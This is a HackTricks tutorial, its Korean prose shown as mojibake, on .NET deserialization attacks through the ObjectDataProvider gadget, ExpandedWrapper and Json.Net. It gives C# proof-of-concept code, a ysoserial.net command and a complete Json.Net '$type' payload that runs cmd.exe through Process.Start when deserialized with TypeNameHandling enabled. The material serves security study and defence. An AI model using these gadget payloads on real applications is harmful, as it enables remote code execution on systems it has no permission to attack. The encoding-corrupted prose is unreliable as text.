# Basic .Net deserialization (ObjectDataProvider gadget, ExpandedWrapper, and Json.Net)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

ì´ ê²Œì‹œë¬¼ì€ **ObjectDataProvider ê°€ì ¯ì´ ì–´ë–»ê²Œ ì•…ìš©ë˜ëŠ”ì§€ ì´í•´í•˜ê¸° ìœ„í•´** ì‘ì„±ë˜ì—ˆìŠµë‹ˆë‹¤. RCEë¥¼ ì–»ê¸° ìœ„í•´ **Json.Net ë° xmlSerializerì™€ í•¨ê»˜** ì´ ê°€ì ¯ì´ **ì–´ë–»ê²Œ ë‚¨ìš©ë  ìˆ˜ ìˆëŠ”ì§€** ì„¤ëª…í•©ë‹ˆë‹¤.

## ObjectDataProvider ê°€ì ¯

ë¬¸ì„œì—ì„œ: _ObjectDataProvider í´ë˜ìŠ¤ëŠ” ë°”ì¸ë”© ì†ŒìŠ¤ë¡œ ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ê°ì²´ë¥¼ ë˜í•‘í•˜ê³  ìƒì„±í•©ë‹ˆë‹¤._\
ë„¤, ì´ìƒí•œ ì„¤ëª…ì´ë‹ˆ ì´ í´ë˜ìŠ¤ê°€ ì™œ í¥ë¯¸ë¡œìš´ì§€ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤: ì´ í´ë˜ìŠ¤ëŠ” **ì„ì˜ì˜ ê°ì²´ë¥¼ ë˜í•‘**í•˜ê³ , _**MethodParameters**_ë¥¼ ì‚¬ìš©í•˜ì—¬ **ì„ì˜ì˜ ë§¤ê°œë³€ìˆ˜ë¥¼ ì„¤ì •**í•œ ë‹¤ìŒ, **MethodNameì„ ì‚¬ìš©í•˜ì—¬ ì„ì˜ì˜ ê°ì²´ì˜ ì„ì˜ì˜ í•¨ìˆ˜ë¥¼ í˜¸ì¶œ**í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤.\
ë”°ë¼ì„œ ì„ì˜ì˜ **ê°ì²´**ëŠ” **ì—­ì§ë ¬í™”ë˜ëŠ” ë™ì•ˆ ë§¤ê°œë³€ìˆ˜ì™€ í•¨ê»˜** **í•¨ìˆ˜**ë¥¼ **ì‹¤í–‰**í•©ë‹ˆë‹¤.

### **ì´ê²Œ ì–´ë–»ê²Œ ê°€ëŠ¥í• ê¹Œìš”**

**System.Windows.Data** ë„¤ì„ìŠ¤í˜ì´ìŠ¤ëŠ” `C:\Windows\Microsoft.NET\Framework\v4.0.30319\WPF`ì˜ **PresentationFramework.dll** ë‚´ì— ì •ì˜ë˜ê³  êµ¬í˜„ë˜ì–´ ìˆìŠµë‹ˆë‹¤.

[**dnSpy**](https://github.com/0xd4d/dnSpy)ë¥¼ ì‚¬ìš©í•˜ì—¬ ìš°ë¦¬ê°€ ê´€ì‹¬ ìˆëŠ” í´ë˜ìŠ¤ì˜ **ì½”ë“œë¥¼ ê²€ì‚¬**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì•„ë˜ ì´ë¯¸ì§€ì—ì„œ **PresentationFramework.dll --> System.Windows.Data --> ObjectDataProvider --> Method name**ì˜ ì½”ë“œë¥¼ ë³´ê³  ìˆìŠµë‹ˆë‹¤.

![](<../../.gitbook/assets/image (427).png>)

`MethodName`ì´ ì„¤ì •ë˜ë©´ `base.Refresh()`ê°€ í˜¸ì¶œë˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ê²Œ ë¬´ì—‡ì„ í•˜ëŠ”ì§€ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤:

![](<../../.gitbook/assets/image (319).png>)

ì¢‹ìŠµë‹ˆë‹¤, `this.BeginQuery()`ê°€ ë¬´ì—‡ì„ í•˜ëŠ”ì§€ ê³„ì† ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤. `BeginQuery`ëŠ” `ObjectDataProvider`ì— ì˜í•´ ì¬ì •ì˜ë˜ë©°, ë‹¤ìŒê³¼ ê°™ì€ ì‘ì—…ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤:

![](<../../.gitbook/assets/image (345).png>)

ì½”ë“œ ëë¶€ë¶„ì—ì„œ `this.QueryWorke(null)`ë¥¼ í˜¸ì¶œí•˜ëŠ” ê²ƒì„ ì£¼ëª©í•˜ì„¸ìš”. ì´ê²ƒì´ ë¬´ì—‡ì„ ì‹¤í–‰í•˜ëŠ”ì§€ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤:

![](<../../.gitbook/assets/image (596).png>)

ì´ê²ƒì€ `QueryWorker` í•¨ìˆ˜ì˜ ì „ì²´ ì½”ë“œëŠ” ì•„ë‹ˆì§€ë§Œ, í¥ë¯¸ë¡œìš´ ë¶€ë¶„ì„ ë³´ì—¬ì¤ë‹ˆë‹¤: ì½”ë“œ **`this.InvokeMethodOnInstance(out ex);`ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤.** ì´ ì¤„ì´ **ë©”ì„œë“œ ì„¸íŠ¸ê°€ í˜¸ì¶œë˜ëŠ”** ë¶€ë¶„ì…ë‹ˆë‹¤.

ë‹¨ìˆœíˆ _**MethodName**_\*\*ì„ ì„¤ì •í•˜ëŠ” ê²ƒë§Œìœ¼ë¡œë„ ì‹¤í–‰ë  ê²ƒì„ì„ í™•ì¸í•˜ê³  ì‹¶ë‹¤ë©´, ì´ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```java
using System.Windows.Data;
using System.Diagnostics;

namespace ODPCustomSerialExample
{
class Program
{
static void Main(string[] args)
{
ObjectDataProvider myODP = new ObjectDataProvider();
myODP.ObjectType = typeof(Process);
myODP.MethodParameters.Add("cmd.exe");
myODP.MethodParameters.Add("/c calc.exe");
myODP.MethodName = "Start";
}
}
}
```
Note that you need to add as reference _C:\Windows\Microsoft.NET\Framework\v4.0.30319\WPF\PresentationFramework.dll_ in order to load `System.Windows.Data`

## ExpandedWrapper

ì´ì „ì˜ ìµìŠ¤í”Œë¡œì‡ì„ ì‚¬ìš©í•˜ë©´ **ê°ì²´**ê°€ _**ObjectDataProvider**_ ì¸ìŠ¤í„´ìŠ¤ë¡œ **ì—­ì§ë ¬í™”ë ** ê²½ìš°ê°€ ìˆìŠµë‹ˆë‹¤(ì˜ˆ: DotNetNuke ì·¨ì•½ì ì—ì„œ XmlSerializerë¥¼ ì‚¬ìš©í•˜ì—¬ ê°ì²´ê°€ `GetType`ì„ ì‚¬ìš©í•˜ì—¬ ì—­ì§ë ¬í™”ë¨). ê·¸ëŸ¬ë©´ _ObjectDataProvider_ ì¸ìŠ¤í„´ìŠ¤ì— **í¬ì¥ëœ ê°ì²´ ìœ í˜•ì— ëŒ€í•œ ì§€ì‹ì´ ì—†ìŠµë‹ˆë‹¤**(ì˜ˆ: `Process`). [ì—¬ê¸°ì—ì„œ DotNetNuke ì·¨ì•½ì ì— ëŒ€í•œ ë” ë§ì€ ì •ë³´ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤](https://translate.google.com/translate?hl=en\&sl=auto\&tl=en\&u=https%3A%2F%2Fpaper.seebug.org%2F365%2F\&sandbox=1).

ì´ í´ë˜ìŠ¤ëŠ” ì£¼ì–´ì§„ ì¸ìŠ¤í„´ìŠ¤ì— ìº¡ìŠí™”ëœ ê°ì²´ì˜ **ê°ì²´ ìœ í˜•ì„ ì§€ì •í•  ìˆ˜ ìˆê²Œ** í•´ì¤ë‹ˆë‹¤. ë”°ë¼ì„œ ì´ í´ë˜ìŠ¤ëŠ” ì†ŒìŠ¤ ê°ì²´(_ObjectDataProvider_)ë¥¼ ìƒˆë¡œìš´ ê°ì²´ ìœ í˜•ìœ¼ë¡œ ìº¡ìŠí™”í•˜ê³  ìš°ë¦¬ê°€ í•„ìš”í•œ ì†ì„±(_ObjectDataProvider.MethodName_ ë° _ObjectDataProvider.MethodParameters_)ì„ ì œê³µí•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ì´ëŠ” ì•ì„œ ì œì‹œëœ ê²½ìš°ì™€ ê°™ì€ ê²½ìš°ì— ë§¤ìš° ìœ ìš©í•©ë‹ˆë‹¤. ì™œëƒí•˜ë©´ ìš°ë¦¬ëŠ” **\_ObjectDataProvider**_\*\*ë¥¼ \*\*_**ExpandedWrapper** \_ ì¸ìŠ¤í„´ìŠ¤ ì•ˆì— **í¬ì¥í•  ìˆ˜** ìˆê³  **ì—­ì§ë ¬í™”ë  ë•Œ** ì´ í´ë˜ìŠ¤ëŠ” _**OjectDataProvider**_ ê°ì²´ë¥¼ **ìƒì„±**í•˜ì—¬ _**MethodName**_ì— ì§€ì •ëœ **í•¨ìˆ˜**ë¥¼ **ì‹¤í–‰**í•  ê²ƒì…ë‹ˆë‹¤.

ë‹¤ìŒ ì½”ë“œë¥¼ ì‚¬ìš©í•˜ì—¬ ì´ ë˜í¼ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```java
using System.Windows.Data;
using System.Diagnostics;
using System.Data.Services.Internal;

namespace ODPCustomSerialExample
{
class Program
{
static void Main(string[] args)
{
ExpandedWrapper<Process, ObjectDataProvider> myExpWrap = new ExpandedWrapper<Process, ObjectDataProvider>();
myExpWrap.ProjectedProperty0 = new ObjectDataProvider();
myExpWrap.ProjectedProperty0.ObjectInstance = new Process();
myExpWrap.ProjectedProperty0.MethodParameters.Add("cmd.exe");
myExpWrap.ProjectedProperty0.MethodParameters.Add("/c calc.exe");
myExpWrap.ProjectedProperty0.MethodName = "Start";
}
}
}
```
## Json.Net

[ê³µì‹ ì›¹ í˜ì´ì§€](https://www.newtonsoft.com/json)ì—ì„œëŠ” ì´ ë¼ì´ë¸ŒëŸ¬ë¦¬ê°€ **Json.NETì˜ ê°•ë ¥í•œ JSON ì§ë ¬ ë³€í™˜ê¸°ë¥¼ ì‚¬ìš©í•˜ì—¬ ëª¨ë“  .NET ê°ì²´ë¥¼ ì§ë ¬í™” ë° ì—­ì§ë ¬í™”í•  ìˆ˜ ìˆë„ë¡ í•œë‹¤**ê³  ëª…ì‹œë˜ì–´ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ **ObjectDataProvider ê°€ì ¯ì„ ì—­ì§ë ¬í™”**í•  ìˆ˜ ìˆë‹¤ë©´, ê°ì²´ë¥¼ ì—­ì§ë ¬í™”í•˜ëŠ” ê²ƒë§Œìœ¼ë¡œë„ **RCE**ë¥¼ ìœ ë°œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Json.Net ì˜ˆì œ

ìš°ì„  ì´ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ê°ì²´ë¥¼ **ì§ë ¬í™”/ì—­ì§ë ¬í™”**í•˜ëŠ” ë°©ë²•ì— ëŒ€í•œ ì˜ˆì œë¥¼ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤:
```java
using System;
using Newtonsoft.Json;
using System.Diagnostics;
using System.Collections.Generic;

namespace DeserializationTests
{
public class Account
{
public string Email { get; set; }
public bool Active { get; set; }
public DateTime CreatedDate { get; set; }
public IList<string> Roles { get; set; }
}
class Program
{
static void Main(string[] args)
{
Account account = new Account
{
Email = "james@example.com",
Active = true,
CreatedDate = new DateTime(2013, 1, 20, 0, 0, 0, DateTimeKind.Utc),
Roles = new List<string>
{
"User",
"Admin"
}
};
//Serialize the object and print it
string json = JsonConvert.SerializeObject(account);
Console.WriteLine(json);
//{"Email":"james@example.com","Active":true,"CreatedDate":"2013-01-20T00:00:00Z","Roles":["User","Admin"]}

//Deserialize it
Account desaccount = JsonConvert.DeserializeObject<Account>(json);
Console.WriteLine(desaccount.Email);
}
}
}
```
### Json.Net ì•…ìš©

[ysoserial.net](https://github.com/pwntester/ysoserial.net)ì„ ì‚¬ìš©í•˜ì—¬ ìµìŠ¤í”Œë¡œì‡ì„ ìƒì„±í–ˆìŠµë‹ˆë‹¤:
```java
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"
{
'$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
'MethodName':'Start',
'MethodParameters':{
'$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
'$values':['cmd', '/c calc.exe']
},
'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
```
ì´ ì½”ë“œì—ì„œ **ìµìŠ¤í”Œë¡œì‡ì„ í…ŒìŠ¤íŠ¸**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëƒ¥ ì‹¤í–‰í•˜ë©´ calcê°€ ì‹¤í–‰ë˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```java
using System;
using System.Text;
using Newtonsoft.Json;

namespace DeserializationTests
{
class Program
{
static void Main(string[] args)
{
//Declare exploit
string userdata = @"{
'$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
'MethodName':'Start',
'MethodParameters':{
'$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
'$values':['cmd', '/c calc.exe']
},
'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}";
//Exploit to base64
string userdata_b64 = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(userdata));

//Get data from base64
byte[] userdata_nob64 = Convert.FromBase64String(userdata_b64);
//Deserialize data
string userdata_decoded = Encoding.UTF8.GetString(userdata_nob64);
object obj = JsonConvert.DeserializeObject<object>(userdata_decoded, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
}
}
}
```
{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
